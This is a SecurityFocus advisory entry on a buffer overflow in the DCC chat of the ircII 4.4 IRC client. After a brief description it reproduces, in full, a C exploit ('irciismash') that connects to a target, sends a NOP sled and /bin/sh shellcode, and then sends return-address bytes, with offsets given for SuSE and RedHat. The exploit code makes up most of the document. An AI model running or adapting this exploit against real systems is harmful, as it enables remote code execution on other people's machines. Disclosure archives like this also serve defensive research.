source: http://www.securityfocus.com/bid/1046/info

IrcII is a well-known Internet Relay Chat (IRC) client for unix. Version 4.4-7 and possibly previous versions are known to be vulnerable to a buffer overflow condition in their direct client-to-client (DCC) chat implementation. It may be possible to execute arbitrary code on a client attempting to initiate a dcc chat. Exploitation this vulnerability could result in a remote compromise with the privileges of the user running the ircII client.

This vulnerability was present in the "port" made available with FreeBSD. It is not installed by default.


/*

  ircii-4.4 exploit by bladi & aLmUDeNa                        
                                                                                                                              
  buffer overflow in ircii dcc chat's                          
  allow to excute arbitrary                  
                                                               
  Affected:                                                    
           ircII-4.4                                           
                                                               
  Patch:                                                       
         Upgrade to ircII-4.4M                                 
  ftp://ircftp.au.eterna.com.au/pub/ircII/ircii-4.4M.tar.gz    
                                                               
  Offset:                                                      
         SuSe 6.x :0xbfffe3ff                                  
         RedHat   :0xbfffe888
                                                               
  Thanks to : #warinhell,#hacker_novatos
  Special thanks go to: Topo[lb],
	Saludos para todos los que nos conozcan especialmente para eva ;)
                                         (bladi@euskalnet.net)  
*/

#include <stdio.h>
#include <netdb.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

char *h_to_ip(char *hostname);
char *h_to_ip(char *hostname) {
  struct hostent *hozt;
  struct sockaddr_in tmp;
  struct in_addr in;
  if ((hozt=gethostbyname(hostname))==NULL)
      {
      printf(" ERROR: IP incorrecta\n");
      exit(0);                                     
      }
  memcpy((caddr_t)&tmp.sin_addr.s_addr, hozt->h_addr, hozt->h_length);
  memcpy(&in,&tmp.sin_addr.s_addr,4);
  return(inet_ntoa(in));
}
main(int argc, char *argv[])
{
  struct sockaddr_in sin;
  char *hostname;
  char nops[] =
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
  char *shell =
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff/bin/sh";
  int outsocket,tnt,i;
printf (" irciismash  ver: 1.0\n");
printf ("         by         \n");
printf ("  bladi & aLmUDeNa\n\n");

if (argc<3)
    {                        
    printf("Usage : %s hostname port\n",argv[0]);
    exit(-1);
    }
hostname=argv[1];
outsocket=socket(AF_INET,SOCK_STREAM,0);
sin.sin_family=AF_INET;
sin.sin_port=htons(atoi(argv[2]));
sin.sin_addr.s_addr=inet_addr(h_to_ip(hostname));
if (connect (outsocket, (struct sockaddr *) &sin, sizeof(sin)) == -1) {
printf(" ERROR: El puerto esta cerradito :_(\n");
exit(0);
}
    printf("[1]- Noping\n    [");
    for(i=0;i<47;i++)
        {
        if (!(i % 7)) { usleep (9); printf("."); fflush(stdout); }
        write(outsocket,nops,strlen(nops));
        }
    printf("]\n");
    printf("     Noped\n");
    printf("[2]- Injectin shellcode\n");
    write(outsocket,shell,strlen(shell));    
    usleep(999);
    printf("     Injected\n");
    printf("[3]- Waiting\n [");
    for(i=0;i<299;i++)
        {
        printf(".");
        fflush(stdout);
        usleep(99);
        write(outsocket,"\xff",strlen("\xff"));
        write(outsocket,"\xbf",strlen("\xff"));
        write(outsocket,"\xff",strlen("\xe9"));
        write(outsocket,"\xe3",strlen("\xff"));
        }
printf("]\n[4]- Xploit \n - --(DoNe)-- -\n");
close(outsocket);
}
